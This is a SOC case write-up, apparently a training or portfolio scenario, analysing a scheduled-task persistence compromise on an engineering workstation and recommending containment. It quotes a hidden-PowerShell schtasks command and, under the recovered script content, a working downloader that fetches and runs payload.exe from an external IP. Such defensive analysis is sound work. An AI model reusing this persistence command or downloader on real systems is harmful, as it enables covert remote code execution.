# Scenario 3 — Persistence & Correlation

---

## 1. Alert Summary

User `j.smith` created a scheduled task on host `ENG-WS-022` that executes a hidden PowerShell script every 30 minutes:

`schtasks /create /sc minute /mo 30 /tn "Updater" /tr "powershell.exe -WindowStyle Hidden -File C:\Users\j.smith\AppData\Local\update.ps1"`

The script downloads and executes a binary from an external IP (`91.214.124.77`). The combination of persistence, hidden execution, external payload retrieval, and repeated execution indicates **high-confidence malicious activity**.

---

## 2. Initial Context

- Host role: Engineering workstation  
- User: `j.smith` (non-administrative user)  
- Baseline: Development tools and occasional scripting; no requirement to create scheduled tasks or run hidden PowerShell for persistence  

**Risk implication:**

The behavior deviates from baseline by introducing persistence and external code execution on a non-admin user workstation, indicating potential compromise and ongoing unauthorized access.

---

## 3. SOC Case Note

### Alert Assessment

**Likely Malicious — Containment Required**

---

### Key Observations

- `powershell.exe` initiated command execution via `cmd.exe`  
- `schtasks.exe` used to create a scheduled task named `"Updater"`  
- Task configured to run every 30 minutes  
- PowerShell executed with `-WindowStyle Hidden`  
- Script created in user AppData directory  
- Script downloads executable from external IP  
- Downloaded file executed via PowerShell  
- Outbound network connection to external IP observed  

---

### Investigation Reasoning

**Step 1 — Persistence Mechanism**

The use of `schtasks` with `/sc minute /mo 30` creates a scheduled task that executes every 30 minutes.  
This ensures repeated execution of the malicious script, allowing the attacker to maintain persistence on the host.

---

**Step 2 — Script Behavior**

The script uses `WebClient.DownloadFile` to retrieve an executable from an external IP and then executes it using `Start-Process`.  
This behavior is consistent with payload delivery followed by execution.

---

**Step 3 — Execution Pattern**

The scheduled task enforces repeated execution at regular intervals.  
This allows the attacker to maintain control, re-establish execution if interrupted, and potentially update payloads over time.

---

**Step 4 — Location Analysis**

The script is stored in `AppData\Local`, a user-writable directory commonly used by malware to avoid detection and blend with normal activity.

---

**Step 5 — Full Correlation**

The sequence shows:

- Command execution initiated via PowerShell  
- Scheduled task created for persistence  
- Malicious script written to disk  
- Script downloads payload from external source  
- Payload executed repeatedly via scheduled task  

This represents a full compromise chain:

**execution → persistence → payload delivery → repeated execution**

---

### Decision

**Likely Malicious — Immediate containment required**

---

### Recommended Actions

**Immediate:**

- Isolate `ENG-WS-022` from the network  
- Terminate related processes (`powershell.exe`, `schtasks.exe`, `temp.exe`)  
- Remove scheduled task `"Updater"`  

**Follow-up:**

- Analyze `update.ps1` and `temp.exe`  
- Block outbound traffic to `91.214.124.77`  
- Reset credentials for `j.smith`  
- Review environment for additional persistence or lateral movement  

---

## 4. Key Takeaways

- Scheduled tasks are a common persistence mechanism used by attackers  
- Repeated execution intervals indicate sustained unauthorized access  
- External payload download and execution is a high-confidence indicator of compromise  
- Living-off-the-land binaries enable stealthy execution  
- Correlating multiple weak signals reveals full attack intent  

---

## 5. What This Demonstrates

- Ability to correlate endpoint telemetry into a full attack chain  
- Identification of persistence techniques and execution patterns  
- Strong understanding of attacker behavior using native tools  
- SOC-level analytical reasoning and confident decision-making  

---

## 6. Evidence & Telemetry

### Process Creation — cmd.exe spawning schtasks

```text
Image: C:\Windows\System32\cmd.exe
CommandLine: cmd.exe /c schtasks /create /sc minute /mo 30 /tn "Updater" /tr "powershell.exe -WindowStyle Hidden -File C:\Users\j.smith\AppData\Local\update.ps1"
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: j.smith
```

---

### Scheduled Task Creation

```text
Image: C:\Windows\System32\schtasks.exe
CommandLine: schtasks /create /sc minute /mo 30 /tn "Updater" ...
```

---

### File Creation — Malicious Script

```text
File Created:
C:\Users\j.smith\AppData\Local\update.ps1
```

---

### Script Content (Recovered)

```powershell
$client = New-Object System.Net.WebClient
$client.DownloadFile("http://91.214.124.77/payload.exe","C:\Users\j.smith\AppData\Local\temp.exe")
Start-Process "C:\Users\j.smith\AppData\Local\temp.exe"
```

---

### Network Connection

```text
Process: powershell.exe
DestinationIp: 91.214.124.77
DestinationPort: 80
```

---
